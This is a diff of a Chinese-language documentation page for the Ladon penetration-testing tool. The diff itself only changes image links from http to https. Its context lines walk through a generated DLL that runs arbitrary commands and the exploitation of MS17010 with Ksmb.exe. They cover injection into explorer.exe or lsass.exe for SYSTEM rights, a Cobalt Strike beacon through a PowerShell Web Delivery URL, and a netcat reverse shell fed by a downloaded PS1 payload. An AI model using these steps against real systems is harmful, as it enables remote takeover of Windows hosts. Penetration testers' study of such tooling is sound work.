@@ -217,13 +217,13 @@ window.location.href="http://k8gege.org/Ladon/cmddll.html";
 
 <p>复现0day前，测试是必须的，先保证DLL功能正常，才能拿去复现漏洞，不然你不知道是漏洞的DLL注入或DLL加载器没调好，还是DLL本身有问题，DLL启动参数是任意的，意味着不管漏洞注入导出函数是什么，都能加载，所以我们可用于多个已知漏洞或以后新出的0day漏洞测试。</p>
 <h3 id="GUI用法"><a href="#GUI用法" class="headerlink" title="GUI用法"></a>GUI用法</h3><p>由于生成DLL都是本地生成，使用CMD版比较麻烦，所以该功能添加到GUI中。用法打开LadonGUI–CmdDll模块，上文本框填写需要执行的CMD命令，CMD执行有两种方式，一是默认的CMD执行，二是PowerShell Base64加密执行，(勾选Base64Cmd),根据需要点击对应系统位数生成DLL。</p>
-<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/cmddll_calc.PNG"></p>
-<h4 id="弹计算器演示"><a href="#弹计算器演示" class="headerlink" title="弹计算器演示"></a>弹计算器演示</h4><p>为了方便，可以通过GUI上的TEST按钮测试DLL功能<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/cmddll_calc.gif"></p>
+<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/cmddll_calc.PNG"></p>
+<h4 id="弹计算器演示"><a href="#弹计算器演示" class="headerlink" title="弹计算器演示"></a>弹计算器演示</h4><p>为了方便，可以通过GUI上的TEST按钮测试DLL功能<br><img alt data-original="https://k8gege.org/k8img/Ladon/exe/cmddll_calc.gif"></p>
 <h4 id="MS17010漏洞CS上线演示"><a href="#MS17010漏洞CS上线演示" class="headerlink" title="MS17010漏洞CS上线演示"></a>MS17010漏洞CS上线演示</h4><p>1 通过命令 Ladon 192.168.1.8/24 MS17010 扫描发现192.168.1.106主机存在MS17010漏洞<br>2 配置好CS监听器，使用“Web Delivery”生成powershell的URL监听<br>3 LadonGUI-CmdDLL-CS文本框填写URL，如<a href="http://192.168.1.108/a，生成x86的DLL(目标32位系统)" target="_blank" rel="noopener">http://192.168.1.108/a，生成x86的DLL(目标32位系统)</a><br>4 使用命令 Ksmb.exe 192.168.1.106 445 sc32.dll explorer.exe，远程溢出106主机并将dll注入explorer.exe,注入explorer进程得到的是当前用户权限，如果注入lsass.exe得到的是system权限，其它进程也是同理，看进程启动所使用的权限，实际测试请根据需要，如遇到不出网的情况，需添加用户注入explorer可能就会失败，因为有些机器开启UAC。</p>
-<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/cmddll_ms17010_cs.gif"></p>
+<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/cmddll_ms17010_cs.gif"></p>
 <h4 id="MS17010漏洞NC反弹演示"><a href="#MS17010漏洞NC反弹演示" class="headerlink" title="MS17010漏洞NC反弹演示"></a>MS17010漏洞NC反弹演示</h4><p>可能有些机器存在杀软查杀CS，导致无法直接上线CS，这时我们可使用NC或MSF上线</p>
 <p>1 通过命令 Ladon 192.168.1.8/24 MS17010 扫描发现192.168.1.106主机存在MS17010漏洞<br>2 打开LadonGui-NetCat-启动监听，默认监听本机4444端口,使用 Ladon web 800 启动WEB，在GUI里填写对应PS1的下载地址，如<a href="http://192.168.1.108:800/Ladon.ps1，实战若是需要远程内存加载其它powershell框架,下载exe、dll等文件均可使用Ladon的web模块监听" target="_blank" rel="noopener">http://192.168.1.108:800/Ladon.ps1，实战若是需要远程内存加载其它powershell框架,下载exe、dll等文件均可使用Ladon的web模块监听</a><br>3 LadonGUI-CmdDLL-填写IP和端口，生成NC x86的DLL(目标32位系统)<br>4 使用命令 Ksmb.exe 192.168.1.106 445 sc32.dll explorer.exe，远程溢出106主机，成功反弹shell</p>
-<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/cmddll_ms17010_nc.gif"></p>
+<p><img alt data-original="https://k8gege.org/k8img/Ladon/exe/cmddll_ms17010_nc.gif"></p>
 <p>####　CVE-2021-40444 Office漏洞复现CS上线</p>
 <p><a href="http://k8gege.org/Ladon/CVE-2021-40444.html">http://k8gege.org/Ladon/CVE-2021-40444.html</a></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.9版本：K8小密圈</p>
